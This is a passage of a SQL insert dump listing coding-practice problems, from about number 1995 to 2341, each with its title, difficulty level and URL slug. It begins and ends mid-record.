Subsets','Hard','the-number-of-good-subsets',1),(1995,'Count Special Quadruplets','Easy','count-special-quadruplets',1),(1996,'The Number of Weak Characters in the Game','Medium','the-number-of-weak-characters-in-the-game',1),(1997,'First Day Where You Have Been in All the Rooms','Medium','first-day-where-you-have-been-in-all-the-rooms',1),(1998,'GCD Sort of an Array','Hard','gcd-sort-of-an-array',1),(1999,'Smallest Greater Multiple Made of Two Digits','Medium','smallest-greater-multiple-made-of-two-digits',1),(2000,'Reverse Prefix of Word','Easy','reverse-prefix-of-word',1),(2001,'Number of Pairs of Interchangeable Rectangles','Medium','number-of-pairs-of-interchangeable-rectangles',1),(2002,'Maximum Product of the Length of Two Palindromic Subsequences','Medium','maximum-product-of-the-length-of-two-palindromic-subsequences',1),(2003,'Smallest Missing Genetic Value in Each Subtree','Hard','smallest-missing-genetic-value-in-each-subtree',1),(2004,'The Number of Seniors and Juniors to Join the Company','Hard','the-number-of-seniors-and-juniors-to-join-the-company',1),(2005,'Subtree Removal Game with Fibonacci Tree','Hard','subtree-removal-game-with-fibonacci-tree',1),(2006,'Count Number of Pairs With Absolute Difference K','Easy','count-number-of-pairs-with-absolute-difference-k',1),(2007,'Find Original Array From Doubled Array','Medium','find-original-array-from-doubled-array',1),(2008,'Maximum Earnings From Taxi','Medium','maximum-earnings-from-taxi',1),(2009,'Minimum Number of Operations to Make Array Continuous','Hard','minimum-number-of-operations-to-make-array-continuous',1),(2010,'The Number of Seniors and Juniors to Join the Company II','Hard','the-number-of-seniors-and-juniors-to-join-the-company-ii',1),(2011,'Final Value of Variable After Performing Operations','Easy','final-value-of-variable-after-performing-operations',1),(2012,'Sum of Beauty in the Array','Medium','sum-of-beauty-in-the-array',1),(2013,'Detect Squares','Medium','detect-squares',1),(2014,'Longest Subsequence Repeated k Times','Hard','longest-subsequence-repeated-k-times',1),(2015,'Average Height of Buildings in Each Segment','Medium','average-height-of-buildings-in-each-segment',1),(2016,'Maximum Difference Between Increasing Elements','Easy','maximum-difference-between-increasing-elements',1),(2017,'Grid Game','Medium','grid-game',1),(2018,'Check if Word Can Be Placed In Crossword','Medium','check-if-word-can-be-placed-in-crossword',1),(2019,'The Score of Students Solving Math Expression','Hard','the-score-of-students-solving-math-expression',1),(2020,'Number of Accounts That Did Not Stream','Medium','number-of-accounts-that-did-not-stream',1),(2021,'Brightest Position on Street','Medium','brightest-position-on-street',1),(2022,'Convert 1D Array Into 2D Array','Easy','convert-1d-array-into-2d-array',1),(2023,'Number of Pairs of Strings With Concatenation Equal to Target','Medium','number-of-pairs-of-strings-with-concatenation-equal-to-target',1),(2024,'Maximize the Confusion of an Exam','Medium','maximize-the-confusion-of-an-exam',1),(2025,'Maximum Number of Ways to Partition an Array','Hard','maximum-number-of-ways-to-partition-an-array',1),(2026,'Low-Quality Problems','Easy','low-quality-problems',1),(2027,'Minimum Moves to Convert String','Easy','minimum-moves-to-convert-string',1),(2028,'Find Missing Observations','Medium','find-missing-observations',1),(2029,'Stone Game IX','Medium','stone-game-ix',1),(2030,'Smallest K-Length Subsequence With Occurrences of a Letter','Hard','smallest-k-length-subsequence-with-occurrences-of-a-letter',1),(2031,'Count Subarrays With More Ones Than Zeros','Medium','count-subarrays-with-more-ones-than-zeros',1),(2032,'Two Out of Three','Easy','two-out-of-three',1),(2033,'Minimum Operations to Make a Uni-Value Grid','Medium','minimum-operations-to-make-a-uni-value-grid',1),(2034,'Stock Price Fluctuation ','Medium','stock-price-fluctuation',1),(2035,'Partition Array Into Two Arrays to Minimize Sum Difference','Hard','partition-array-into-two-arrays-to-minimize-sum-difference',1),(2036,'Maximum Alternating Subarray Sum','Medium','maximum-alternating-subarray-sum',1),(2037,'Minimum Number of Moves to Seat Everyone','Easy','minimum-number-of-moves-to-seat-everyone',1),(2038,'Remove Colored Pieces if Both Neighbors are the Same Color','Medium','remove-colored-pieces-if-both-neighbors-are-the-same-color',1),(2039,'The Time When the Network Becomes Idle','Medium','the-time-when-the-network-becomes-idle',1),(2040,'Kth Smallest Product of Two Sorted Arrays','Hard','kth-smallest-product-of-two-sorted-arrays',1),(2041,'Accepted Candidates From the Interviews','Medium','accepted-candidates-from-the-interviews',1),(2042,'Check if Numbers Are Ascending in a Sentence','Easy','check-if-numbers-are-ascending-in-a-sentence',1),(2043,'Simple Bank System','Medium','simple-bank-system',1),(2044,'Count Number of Maximum Bitwise-OR Subsets','Medium','count-number-of-maximum-bitwise-or-subsets',1),(2045,'Second Minimum Time to Reach Destination','Hard','second-minimum-time-to-reach-destination',1),(2046,'Sort Linked List Already Sorted Using Absolute Values','Medium','sort-linked-list-already-sorted-using-absolute-values',1),(2047,'Number of Valid Words in a Sentence','Easy','number-of-valid-words-in-a-sentence',1),(2048,'Next Greater Numerically Balanced Number','Medium','next-greater-numerically-balanced-number',1),(2049,'Count Nodes With the Highest Score','Medium','count-nodes-with-the-highest-score',1),(2050,'Parallel Courses III','Hard','parallel-courses-iii',1),(2051,'The Category of Each Member in the Store','Medium','the-category-of-each-member-in-the-store',1),(2052,'Minimum Cost to Separate Sentence Into Rows','Medium','minimum-cost-to-separate-sentence-into-rows',1),(2053,'Kth Distinct String in an Array','Easy','kth-distinct-string-in-an-array',1),(2054,'Two Best Non-Overlapping Events','Medium','two-best-non-overlapping-events',1),(2055,'Plates Between Candles','Medium','plates-between-candles',1),(2056,'Number of Valid Move Combinations On Chessboard','Hard','number-of-valid-move-combinations-on-chessboard',1),(2057,'Smallest Index With Equal Value','Easy','smallest-index-with-equal-value',1),(2058,'Find the Minimum and Maximum Number of Nodes Between Critical Points','Medium','find-the-minimum-and-maximum-number-of-nodes-between-critical-points',1),(2059,'Minimum Operations to Convert Number','Medium','minimum-operations-to-convert-number',1),(2060,'Check if an Original String Exists Given Two Encoded Strings','Hard','check-if-an-original-string-exists-given-two-encoded-strings',1),(2061,'Number of Spaces Cleaning Robot Cleaned','Medium','number-of-spaces-cleaning-robot-cleaned',1),(2062,'Count Vowel Substrings of a String','Easy','count-vowel-substrings-of-a-string',1),(2063,'Vowels of All Substrings','Medium','vowels-of-all-substrings',1),(2064,'Minimized Maximum of Products Distributed to Any Store','Medium','minimized-maximum-of-products-distributed-to-any-store',1),(2065,'Maximum Path Quality of a Graph','Hard','maximum-path-quality-of-a-graph',1),(2066,'Account Balance','Medium','account-balance',1),(2067,'Number of Equal Count Substrings','Medium','number-of-equal-count-substrings',1),(2068,'Check Whether Two Strings are Almost Equivalent','Easy','check-whether-two-strings-are-almost-equivalent',1),(2069,'Walking Robot Simulation II','Medium','walking-robot-simulation-ii',1),(2070,'Most Beautiful Item for Each Query','Medium','most-beautiful-item-for-each-query',1),(2071,'Maximum Number of Tasks You Can Assign','Hard','maximum-number-of-tasks-you-can-assign',1),(2072,'The Winner University','Easy','the-winner-university',1),(2073,'Time Needed to Buy Tickets','Easy','time-needed-to-buy-tickets',1),(2074,'Reverse Nodes in Even Length Groups','Medium','reverse-nodes-in-even-length-groups',1),(2075,'Decode the Slanted Ciphertext','Medium','decode-the-slanted-ciphertext',1),(2076,'Process Restricted Friend Requests','Hard','process-restricted-friend-requests',1),(2077,'Paths in Maze That Lead to Same Room','Medium','paths-in-maze-that-lead-to-same-room',1),(2078,'Two Furthest Houses With Different Colors','Easy','two-furthest-houses-with-different-colors',1),(2079,'Watering Plants','Medium','watering-plants',1),(2080,'Range Frequency Queries','Medium','range-frequency-queries',1),(2081,'Sum of k-Mirror Numbers','Hard','sum-of-k-mirror-numbers',1),(2082,'The Number of Rich Customers','Easy','the-number-of-rich-customers',1),(2083,'Substrings That Begin and End With the Same Letter','Medium','substrings-that-begin-and-end-with-the-same-letter',1),(2084,'Drop Type 1 Orders for Customers With Type 0 Orders','Medium','drop-type-1-orders-for-customers-with-type-0-orders',1),(2085,'Count Common Words With One Occurrence','Easy','count-common-words-with-one-occurrence',1),(2086,'Minimum Number of Food Buckets to Feed the Hamsters','Medium','minimum-number-of-food-buckets-to-feed-the-hamsters',1),(2087,'Minimum Cost Homecoming of a Robot in a Grid','Medium','minimum-cost-homecoming-of-a-robot-in-a-grid',1),(2088,'Count Fertile Pyramids in a Land','Hard','count-fertile-pyramids-in-a-land',1),(2089,'Find Target Indices After Sorting Array','Easy','find-target-indices-after-sorting-array',1),(2090,'K Radius Subarray Averages','Medium','k-radius-subarray-averages',1),(2091,'Removing Minimum and Maximum From Array','Medium','removing-minimum-and-maximum-from-array',1),(2092,'Find All People With Secret','Hard','find-all-people-with-secret',1),(2093,'Minimum Cost to Reach City With Discounts','Medium','minimum-cost-to-reach-city-with-discounts',1),(2094,'Finding 3-Digit Even Numbers','Easy','finding-3-digit-even-numbers',1),(2095,'Delete the Middle Node of a Linked List','Medium','delete-the-middle-node-of-a-linked-list',1),(2096,'Step-By-Step Directions From a Binary Tree Node to Another','Medium','step-by-step-directions-from-a-binary-tree-node-to-another',1),(2097,'Valid Arrangement of Pairs','Hard','valid-arrangement-of-pairs',1),(2098,'Subsequence of Size K With the Largest Even Sum','Medium','subsequence-of-size-k-with-the-largest-even-sum',1),(2099,'Find Subsequence of Length K With the Largest Sum','Easy','find-subsequence-of-length-k-with-the-largest-sum',1),(2100,'Find Good Days to Rob the Bank','Medium','find-good-days-to-rob-the-bank',1),(2101,'Detonate the Maximum Bombs','Medium','detonate-the-maximum-bombs',1),(2102,'Sequentially Ordinal Rank Tracker','Hard','sequentially-ordinal-rank-tracker',1),(2103,'Rings and Rods','Easy','rings-and-rods',1),(2104,'Sum of Subarray Ranges','Medium','sum-of-subarray-ranges',1),(2105,'Watering Plants II','Medium','watering-plants-ii',1),(2106,'Maximum Fruits Harvested After at Most K Steps','Hard','maximum-fruits-harvested-after-at-most-k-steps',1),(2107,'Number of Unique Flavors After Sharing K Candies','Medium','number-of-unique-flavors-after-sharing-k-candies',1),(2108,'Find First Palindromic String in the Array','Easy','find-first-palindromic-string-in-the-array',1),(2109,'Adding Spaces to a String','Medium','adding-spaces-to-a-string',1),(2110,'Number of Smooth Descent Periods of a Stock','Medium','number-of-smooth-descent-periods-of-a-stock',1),(2111,'Minimum Operations to Make the Array K-Increasing','Hard','minimum-operations-to-make-the-array-k-increasing',1),(2112,'The Airport With the Most Traffic','Medium','the-airport-with-the-most-traffic',1),(2113,'Elements in Array After Removing and Replacing Elements','Medium','elements-in-array-after-removing-and-replacing-elements',1),(2114,'Maximum Number of Words Found in Sentences','Easy','maximum-number-of-words-found-in-sentences',1),(2115,'Find All Possible Recipes from Given Supplies','Medium','find-all-possible-recipes-from-given-supplies',1),(2116,'Check if a Parentheses String Can Be Valid','Medium','check-if-a-parentheses-string-can-be-valid',1),(2117,'Abbreviating the Product of a Range','Hard','abbreviating-the-product-of-a-range',1),(2118,'Build the Equation','Hard','build-the-equation',1),(2119,'A Number After a Double Reversal','Easy','a-number-after-a-double-reversal',1),(2120,'Execution of All Suffix Instructions Staying in a Grid','Medium','execution-of-all-suffix-instructions-staying-in-a-grid',1),(2121,'Intervals Between Identical Elements','Medium','intervals-between-identical-elements',1),(2122,'Recover the Original Array','Hard','recover-the-original-array',1),(2123,'Minimum Operations to Remove Adjacent Ones in Matrix','Hard','minimum-operations-to-remove-adjacent-ones-in-matrix',1),(2124,'Check if All A\'s Appears Before All B\'s','Easy','check-if-all-as-appears-before-all-bs',1),(2125,'Number of Laser Beams in a Bank','Medium','number-of-laser-beams-in-a-bank',1),(2126,'Destroying Asteroids','Medium','destroying-asteroids',1),(2127,'Maximum Employees to Be Invited to a Meeting','Hard','maximum-employees-to-be-invited-to-a-meeting',1),(2128,'Remove All Ones With Row and Column Flips','Medium','remove-all-ones-with-row-and-column-flips',1),(2129,'Capitalize the Title','Easy','capitalize-the-title',1),(2130,'Maximum Twin Sum of a Linked List','Medium','maximum-twin-sum-of-a-linked-list',1),(2131,'Longest Palindrome by Concatenating Two Letter Words','Medium','longest-palindrome-by-concatenating-two-letter-words',1),(2132,'Stamping the Grid','Hard','stamping-the-grid',1),(2133,'Check if Every Row and Column Contains All Numbers','Easy','check-if-every-row-and-column-contains-all-numbers',1),(2134,'Minimum Swaps to Group All 1\'s Together II','Medium','minimum-swaps-to-group-all-1s-together-ii',1),(2135,'Count Words Obtained After Adding a Letter','Medium','count-words-obtained-after-adding-a-letter',1),(2136,'Earliest Possible Day of Full Bloom','Hard','earliest-possible-day-of-full-bloom',1),(2137,'Pour Water Between Buckets to Make Water Levels Equal','Medium','pour-water-between-buckets-to-make-water-levels-equal',1),(2138,'Divide a String Into Groups of Size k','Easy','divide-a-string-into-groups-of-size-k',1),(2139,'Minimum Moves to Reach Target Score','Medium','minimum-moves-to-reach-target-score',1),(2140,'Solving Questions With Brainpower','Medium','solving-questions-with-brainpower',1),(2141,'Maximum Running Time of N Computers','Hard','maximum-running-time-of-n-computers',1),(2142,'The Number of Passengers in Each Bus I','Medium','the-number-of-passengers-in-each-bus-i',1),(2143,'Choose Numbers From Two Arrays in Range','Hard','choose-numbers-from-two-arrays-in-range',1),(2144,'Minimum Cost of Buying Candies With Discount','Easy','minimum-cost-of-buying-candies-with-discount',1),(2145,'Count the Hidden Sequences','Medium','count-the-hidden-sequences',1),(2146,'K Highest Ranked Items Within a Price Range','Medium','k-highest-ranked-items-within-a-price-range',1),(2147,'Number of Ways to Divide a Long Corridor','Hard','number-of-ways-to-divide-a-long-corridor',1),(2148,'Count Elements With Strictly Smaller and Greater Elements ','Easy','count-elements-with-strictly-smaller-and-greater-elements',1),(2149,'Rearrange Array Elements by Sign','Medium','rearrange-array-elements-by-sign',1),(2150,'Find All Lonely Numbers in the Array','Medium','find-all-lonely-numbers-in-the-array',1),(2151,'Maximum Good People Based on Statements','Hard','maximum-good-people-based-on-statements',1),(2152,'Minimum Number of Lines to Cover Points','Medium','minimum-number-of-lines-to-cover-points',1),(2153,'The Number of Passengers in Each Bus II','Hard','the-number-of-passengers-in-each-bus-ii',1),(2154,'Keep Multiplying Found Values by Two','Easy','keep-multiplying-found-values-by-two',1),(2155,'All Divisions With the Highest Score of a Binary Array','Medium','all-divisions-with-the-highest-score-of-a-binary-array',1),(2156,'Find Substring With Given Hash Value','Hard','find-substring-with-given-hash-value',1),(2157,'Groups of Strings','Hard','groups-of-strings',1),(2158,'Amount of New Area Painted Each Day','Hard','amount-of-new-area-painted-each-day',1),(2159,'Order Two Columns Independently','Medium','order-two-columns-independently',1),(2160,'Minimum Sum of Four Digit Number After Splitting Digits','Easy','minimum-sum-of-four-digit-number-after-splitting-digits',1),(2161,'Partition Array According to Given Pivot','Medium','partition-array-according-to-given-pivot',1),(2162,'Minimum Cost to Set Cooking Time','Medium','minimum-cost-to-set-cooking-time',1),(2163,'Minimum Difference in Sums After Removal of Elements','Hard','minimum-difference-in-sums-after-removal-of-elements',1),(2164,'Sort Even and Odd Indices Independently','Easy','sort-even-and-odd-indices-independently',1),(2165,'Smallest Value of the Rearranged Number','Medium','smallest-value-of-the-rearranged-number',1),(2166,'Design Bitset','Medium','design-bitset',1),(2167,'Minimum Time to Remove All Cars Containing Illegal Goods','Hard','minimum-time-to-remove-all-cars-containing-illegal-goods',1),(2168,'Unique Substrings With Equal Digit Frequency','Medium','unique-substrings-with-equal-digit-frequency',1),(2169,'Count Operations to Obtain Zero','Easy','count-operations-to-obtain-zero',1),(2170,'Minimum Operations to Make the Array Alternating','Medium','minimum-operations-to-make-the-array-alternating',1),(2171,'Removing Minimum Number of Magic Beans','Medium','removing-minimum-number-of-magic-beans',1),(2172,'Maximum AND Sum of Array','Hard','maximum-and-sum-of-array',1),(2173,'Longest Winning Streak','Hard','longest-winning-streak',1),(2174,'Remove All Ones With Row and Column Flips II','Medium','remove-all-ones-with-row-and-column-flips-ii',1),(2175,'The Change in Global Rankings','Medium','the-change-in-global-rankings',1),(2176,'Count Equal and Divisible Pairs in an Array','Easy','count-equal-and-divisible-pairs-in-an-array',1),(2177,'Find Three Consecutive Integers That Sum to a Given Number','Medium','find-three-consecutive-integers-that-sum-to-a-given-number',1),(2178,'Maximum Split of Positive Even Integers','Medium','maximum-split-of-positive-even-integers',1),(2179,'Count Good Triplets in an Array','Hard','count-good-triplets-in-an-array',1),(2180,'Count Integers With Even Digit Sum','Easy','count-integers-with-even-digit-sum',1),(2181,'Merge Nodes in Between Zeros','Medium','merge-nodes-in-between-zeros',1),(2182,'Construct String With Repeat Limit','Medium','construct-string-with-repeat-limit',1),(2183,'Count Array Pairs Divisible by K','Hard','count-array-pairs-divisible-by-k',1),(2184,'Number of Ways to Build Sturdy Brick Wall','Medium','number-of-ways-to-build-sturdy-brick-wall',1),(2185,'Counting Words With a Given Prefix','Easy','counting-words-with-a-given-prefix',1),(2186,'Minimum Number of Steps to Make Two Strings Anagram II','Medium','minimum-number-of-steps-to-make-two-strings-anagram-ii',1),(2187,'Minimum Time to Complete Trips','Medium','minimum-time-to-complete-trips',1),(2188,'Minimum Time to Finish the Race','Hard','minimum-time-to-finish-the-race',1),(2189,'Number of Ways to Build House of Cards','Medium','number-of-ways-to-build-house-of-cards',1),(2190,'Most Frequent Number Following Key In an Array','Easy','most-frequent-number-following-key-in-an-array',1),(2191,'Sort the Jumbled Numbers','Medium','sort-the-jumbled-numbers',1),(2192,'All Ancestors of a Node in a Directed Acyclic Graph','Medium','all-ancestors-of-a-node-in-a-directed-acyclic-graph',1),(2193,'Minimum Number of Moves to Make Palindrome','Hard','minimum-number-of-moves-to-make-palindrome',1),(2194,'Cells in a Range on an Excel Sheet','Easy','cells-in-a-range-on-an-excel-sheet',1),(2195,'Append K Integers With Minimal Sum','Medium','append-k-integers-with-minimal-sum',1),(2196,'Create Binary Tree From Descriptions','Medium','create-binary-tree-from-descriptions',1),(2197,'Replace Non-Coprime Numbers in Array','Hard','replace-non-coprime-numbers-in-array',1),(2198,'Number of Single Divisor Triplets','Medium','number-of-single-divisor-triplets',1),(2199,'Finding the Topic of Each Post','Hard','finding-the-topic-of-each-post',1),(2200,'Find All K-Distant Indices in an Array','Easy','find-all-k-distant-indices-in-an-array',1),(2201,'Count Artifacts That Can Be Extracted','Medium','count-artifacts-that-can-be-extracted',1),(2202,'Maximize the Topmost Element After K Moves','Medium','maximize-the-topmost-element-after-k-moves',1),(2203,'Minimum Weighted Subgraph With the Required Paths','Hard','minimum-weighted-subgraph-with-the-required-paths',1),(2204,'Distance to a Cycle in Undirected Graph','Hard','distance-to-a-cycle-in-undirected-graph',1),(2205,'The Number of Users That Are Eligible for Discount','Easy','the-number-of-users-that-are-eligible-for-discount',1),(2206,'Divide Array Into Equal Pairs','Easy','divide-array-into-equal-pairs',1),(2207,'Maximize Number of Subsequences in a String','Medium','maximize-number-of-subsequences-in-a-string',1),(2208,'Minimum Operations to Halve Array Sum','Medium','minimum-operations-to-halve-array-sum',1),(2209,'Minimum White Tiles After Covering With Carpets','Hard','minimum-white-tiles-after-covering-with-carpets',1),(2210,'Count Hills and Valleys in an Array','Easy','count-hills-and-valleys-in-an-array',1),(2211,'Count Collisions on a Road','Medium','count-collisions-on-a-road',1),(2212,'Maximum Points in an Archery Competition','Medium','maximum-points-in-an-archery-competition',1),(2213,'Longest Substring of One Repeating Character','Hard','longest-substring-of-one-repeating-character',1),(2214,'Minimum Health to Beat Game','Medium','minimum-health-to-beat-game',1),(2215,'Find the Difference of Two Arrays','Easy','find-the-difference-of-two-arrays',1),(2216,'Minimum Deletions to Make Array Beautiful','Medium','minimum-deletions-to-make-array-beautiful',1),(2217,'Find Palindrome With Fixed Length','Medium','find-palindrome-with-fixed-length',1),(2218,'Maximum Value of K Coins From Piles','Hard','maximum-value-of-k-coins-from-piles',1),(2219,'Maximum Sum Score of Array','Medium','maximum-sum-score-of-array',1),(2220,'Minimum Bit Flips to Convert Number','Easy','minimum-bit-flips-to-convert-number',1),(2221,'Find Triangular Sum of an Array','Medium','find-triangular-sum-of-an-array',1),(2222,'Number of Ways to Select Buildings','Medium','number-of-ways-to-select-buildings',1),(2223,'Sum of Scores of Built Strings','Hard','sum-of-scores-of-built-strings',1),(2224,'Minimum Number of Operations to Convert Time','Easy','minimum-number-of-operations-to-convert-time',1),(2225,'Find Players With Zero or One Losses','Medium','find-players-with-zero-or-one-losses',1),(2226,'Maximum Candies Allocated to K Children','Medium','maximum-candies-allocated-to-k-children',1),(2227,'Encrypt and Decrypt Strings','Hard','encrypt-and-decrypt-strings',1),(2228,'Users With Two Purchases Within Seven Days','Medium','users-with-two-purchases-within-seven-days',1),(2229,'Check if an Array Is Consecutive','Easy','check-if-an-array-is-consecutive',1),(2230,'The Users That Are Eligible for Discount','Easy','the-users-that-are-eligible-for-discount',1),(2231,'Largest Number After Digit Swaps by Parity','Easy','largest-number-after-digit-swaps-by-parity',1),(2232,'Minimize Result by Adding Parentheses to Expression','Medium','minimize-result-by-adding-parentheses-to-expression',1),(2233,'Maximum Product After K Increments','Medium','maximum-product-after-k-increments',1),(2234,'Maximum Total Beauty of the Gardens','Hard','maximum-total-beauty-of-the-gardens',1),(2235,'Add Two Integers','Easy','add-two-integers',1),(2236,'Root Equals Sum of Children','Easy','root-equals-sum-of-children',1),(2237,'Count Positions on Street With Required Brightness','Medium','count-positions-on-street-with-required-brightness',1),(2238,'Number of Times a Driver Was a Passenger','Medium','number-of-times-a-driver-was-a-passenger',1),(2239,'Find Closest Number to Zero','Easy','find-closest-number-to-zero',1),(2240,'Number of Ways to Buy Pens and Pencils','Medium','number-of-ways-to-buy-pens-and-pencils',1),(2241,'Design an ATM Machine','Medium','design-an-atm-machine',1),(2242,'Maximum Score of a Node Sequence','Hard','maximum-score-of-a-node-sequence',1),(2243,'Calculate Digit Sum of a String','Easy','calculate-digit-sum-of-a-string',1),(2244,'Minimum Rounds to Complete All Tasks','Medium','minimum-rounds-to-complete-all-tasks',1),(2245,'Maximum Trailing Zeros in a Cornered Path','Medium','maximum-trailing-zeros-in-a-cornered-path',1),(2246,'Longest Path With Different Adjacent Characters','Hard','longest-path-with-different-adjacent-characters',1),(2247,'Maximum Cost of Trip With K Highways','Hard','maximum-cost-of-trip-with-k-highways',1),(2248,'Intersection of Multiple Arrays','Easy','intersection-of-multiple-arrays',1),(2249,'Count Lattice Points Inside a Circle','Medium','count-lattice-points-inside-a-circle',1),(2250,'Count Number of Rectangles Containing Each Point','Medium','count-number-of-rectangles-containing-each-point',1),(2251,'Number of Flowers in Full Bloom','Hard','number-of-flowers-in-full-bloom',1),(2252,'Dynamic Pivoting of a Table','Hard','dynamic-pivoting-of-a-table',1),(2253,'Dynamic Unpivoting of a Table','Hard','dynamic-unpivoting-of-a-table',1),(2254,'Design Video Sharing Platform','Hard','design-video-sharing-platform',1),(2255,'Count Prefixes of a Given String','Easy','count-prefixes-of-a-given-string',1),(2256,'Minimum Average Difference','Medium','minimum-average-difference',1),(2257,'Count Unguarded Cells in the Grid','Medium','count-unguarded-cells-in-the-grid',1),(2258,'Escape the Spreading Fire','Hard','escape-the-spreading-fire',1),(2259,'Remove Digit From Number to Maximize Result','Easy','remove-digit-from-number-to-maximize-result',1),(2260,'Minimum Consecutive Cards to Pick Up','Medium','minimum-consecutive-cards-to-pick-up',1),(2261,'K Divisible Elements Subarrays','Medium','k-divisible-elements-subarrays',1),(2262,'Total Appeal of A String','Hard','total-appeal-of-a-string',1),(2263,'Make Array Non-decreasing or Non-increasing','Hard','make-array-non-decreasing-or-non-increasing',1),(2264,'Largest 3-Same-Digit Number in String','Easy','largest-3-same-digit-number-in-string',1),(2265,'Count Nodes Equal to Average of Subtree','Medium','count-nodes-equal-to-average-of-subtree',1),(2266,'Count Number of Texts','Medium','count-number-of-texts',1),(2267,' Check if There Is a Valid Parentheses String Path','Hard','check-if-there-is-a-valid-parentheses-string-path',1),(2268,'Minimum Number of Keypresses','Medium','minimum-number-of-keypresses',1),(2269,'Find the K-Beauty of a Number','Easy','find-the-k-beauty-of-a-number',1),(2270,'Number of Ways to Split Array','Medium','number-of-ways-to-split-array',1),(2271,'Maximum White Tiles Covered by a Carpet','Medium','maximum-white-tiles-covered-by-a-carpet',1),(2272,'Substring With Largest Variance','Hard','substring-with-largest-variance',1),(2273,'Find Resultant Array After Removing Anagrams','Easy','find-resultant-array-after-removing-anagrams',1),(2274,'Maximum Consecutive Floors Without Special Floors','Medium','maximum-consecutive-floors-without-special-floors',1),(2275,'Largest Combination With Bitwise AND Greater Than Zero','Medium','largest-combination-with-bitwise-and-greater-than-zero',1),(2276,'Count Integers in Intervals','Hard','count-integers-in-intervals',1),(2277,'Closest Node to Path in Tree','Hard','closest-node-to-path-in-tree',1),(2278,'Percentage of Letter in String','Easy','percentage-of-letter-in-string',1),(2279,'Maximum Bags With Full Capacity of Rocks','Medium','maximum-bags-with-full-capacity-of-rocks',1),(2280,'Minimum Lines to Represent a Line Chart','Medium','minimum-lines-to-represent-a-line-chart',1),(2281,'Sum of Total Strength of Wizards','Hard','sum-of-total-strength-of-wizards',1),(2282,'Number of People That Can Be Seen in a Grid','Medium','number-of-people-that-can-be-seen-in-a-grid',1),(2283,'Check if Number Has Equal Digit Count and Digit Value','Easy','check-if-number-has-equal-digit-count-and-digit-value',1),(2284,'Sender With Largest Word Count','Medium','sender-with-largest-word-count',1),(2285,'Maximum Total Importance of Roads','Medium','maximum-total-importance-of-roads',1),(2286,'Booking Concert Tickets in Groups','Hard','booking-concert-tickets-in-groups',1),(2287,'Rearrange Characters to Make Target String','Easy','rearrange-characters-to-make-target-string',1),(2288,'Apply Discount to Prices','Medium','apply-discount-to-prices',1),(2289,'Steps to Make Array Non-decreasing','Medium','steps-to-make-array-non-decreasing',1),(2290,'Minimum Obstacle Removal to Reach Corner','Hard','minimum-obstacle-removal-to-reach-corner',1),(2291,'Maximum Profit From Trading Stocks','Medium','maximum-profit-from-trading-stocks',1),(2292,'Products With Three or More Orders in Two Consecutive Years','Medium','products-with-three-or-more-orders-in-two-consecutive-years',1),(2293,'Min Max Game','Easy','min-max-game',1),(2294,'Partition Array Such That Maximum Difference Is K','Medium','partition-array-such-that-maximum-difference-is-k',1),(2295,'Replace Elements in an Array','Medium','replace-elements-in-an-array',1),(2296,'Design a Text Editor','Hard','design-a-text-editor',1),(2297,'Jump Game VIII','Medium','jump-game-viii',1),(2298,'Tasks Count in the Weekend','Medium','tasks-count-in-the-weekend',1),(2299,'Strong Password Checker II','Easy','strong-password-checker-ii',1),(2300,'Successful Pairs of Spells and Potions','Medium','successful-pairs-of-spells-and-potions',1),(2301,'Match Substring After Replacement','Hard','match-substring-after-replacement',1),(2302,'Count Subarrays With Score Less Than K','Hard','count-subarrays-with-score-less-than-k',1),(2303,'Calculate Amount Paid in Taxes','Easy','calculate-amount-paid-in-taxes',1),(2304,'Minimum Path Cost in a Grid','Medium','minimum-path-cost-in-a-grid',1),(2305,'Fair Distribution of Cookies','Medium','fair-distribution-of-cookies',1),(2306,'Naming a Company','Hard','naming-a-company',1),(2307,'Check for Contradictions in Equations','Hard','check-for-contradictions-in-equations',1),(2308,'Arrange Table by Gender','Medium','arrange-table-by-gender',1),(2309,'Greatest English Letter in Upper and Lower Case','Easy','greatest-english-letter-in-upper-and-lower-case',1),(2310,'Sum of Numbers With Units Digit K','Medium','sum-of-numbers-with-units-digit-k',1),(2311,'Longest Binary Subsequence Less Than or Equal to K','Medium','longest-binary-subsequence-less-than-or-equal-to-k',1),(2312,'Selling Pieces of Wood','Hard','selling-pieces-of-wood',1),(2313,'Minimum Flips in Binary Tree to Get Result','Hard','minimum-flips-in-binary-tree-to-get-result',1),(2314,'The First Day of the Maximum Recorded Degree in Each City','Medium','the-first-day-of-the-maximum-recorded-degree-in-each-city',1),(2315,'Count Asterisks','Easy','count-asterisks',1),(2316,'Count Unreachable Pairs of Nodes in an Undirected Graph','Medium','count-unreachable-pairs-of-nodes-in-an-undirected-graph',1),(2317,'Maximum XOR After Operations ','Medium','maximum-xor-after-operations',1),(2318,'Number of Distinct Roll Sequences','Hard','number-of-distinct-roll-sequences',1),(2319,'Check if Matrix Is X-Matrix','Easy','check-if-matrix-is-x-matrix',1),(2320,'Count Number of Ways to Place Houses','Medium','count-number-of-ways-to-place-houses',1),(2321,'Maximum Score Of Spliced Array','Hard','maximum-score-of-spliced-array',1),(2322,'Minimum Score After Removals on a Tree','Hard','minimum-score-after-removals-on-a-tree',1),(2323,'Find Minimum Time to Finish All Jobs II','Medium','find-minimum-time-to-finish-all-jobs-ii',1),(2324,'Product Sales Analysis IV','Medium','product-sales-analysis-iv',1),(2325,'Decode the Message','Easy','decode-the-message',1),(2326,'Spiral Matrix IV','Medium','spiral-matrix-iv',1),(2327,'Number of People Aware of a Secret','Medium','number-of-people-aware-of-a-secret',1),(2328,'Number of Increasing Paths in a Grid','Hard','number-of-increasing-paths-in-a-grid',1),(2329,'Product Sales Analysis V','Easy','product-sales-analysis-v',1),(2330,'Valid Palindrome IV','Medium','valid-palindrome-iv',1),(2331,'Evaluate Boolean Binary Tree','Easy','evaluate-boolean-binary-tree',1),(2332,'The Latest Time to Catch a Bus','Medium','the-latest-time-to-catch-a-bus',1),(2333,'Minimum Sum of Squared Difference','Medium','minimum-sum-of-squared-difference',1),(2334,'Subarray With Elements Greater Than Varying Threshold','Hard','subarray-with-elements-greater-than-varying-threshold',1),(2335,'Minimum Amount of Time to Fill Cups','Easy','minimum-amount-of-time-to-fill-cups',1),(2336,'Smallest Number in Infinite Set','Medium','smallest-number-in-infinite-set',1),(2337,'Move Pieces to Obtain a String','Medium','move-pieces-to-obtain-a-string',1),(2338,'Count the Number of Ideal Arrays','Hard','count-the-number-of-ideal-arrays',1),(2339,'All the Matches of the League','Easy','all-the-matches-of-the-league',1),(2340,'Minimum Adjacent Swaps to Make a Valid Array','Medium','minimum-adjacent-swaps-to-make-a-valid-array',1),(2341,'Maximum Number of Pairs in 